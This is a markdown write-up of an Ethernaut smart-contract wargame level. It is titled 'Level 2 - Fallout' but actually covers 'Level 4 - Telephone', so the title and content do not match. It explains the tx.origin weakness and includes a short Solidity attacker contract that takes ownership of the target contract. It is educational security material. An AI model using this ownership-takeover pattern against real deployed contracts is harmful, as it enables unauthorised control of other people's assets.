<div align="center">

<img src="../assets/levels/2-fallout.webp" width="600px"/>
<br><br>
<h1><strong>Ethernaut Level 2 - Fallout</strong></h1>

</div>

## Table of Contents

- [Table of Contents](#table-of-contents)
- [Objectif](#objectif)
- [The hack](#the-hack)
- [Level 4 - Telephone](#level-4---telephone)
- [Solution](#solution)
- [Takeaway](#takeaway)

## Objectif

<img src="../assets/requirements/2-fallout-requirements.webp" width="800px"/>

## The hack

## Level 4 - Telephone

This is a simple one, but exposes the player to an important attact vector - "tx.origin" phishing
Writeup on phishing attacks: https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks

## Solution

Write another contract that calls the deployed Telephone contract and passes in the new owner address

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttack {
    Telephone public telephone;

    constructor(address _telephoneAddress) {
        telephone = Telephone(_telephoneAddress);
    }

    function callChangeOwner() public {
        telephone.changeOwner(msg.sender);
    }
}
```

## Takeaway

- Usage of tx.origin should be done with care, it can lead to phishing attacks, useful in certain cases where you want EOA accounts to call a function for example

<div align="center">
<br>
<h2>🎉 Level completed! 🎉</h2>
</div>
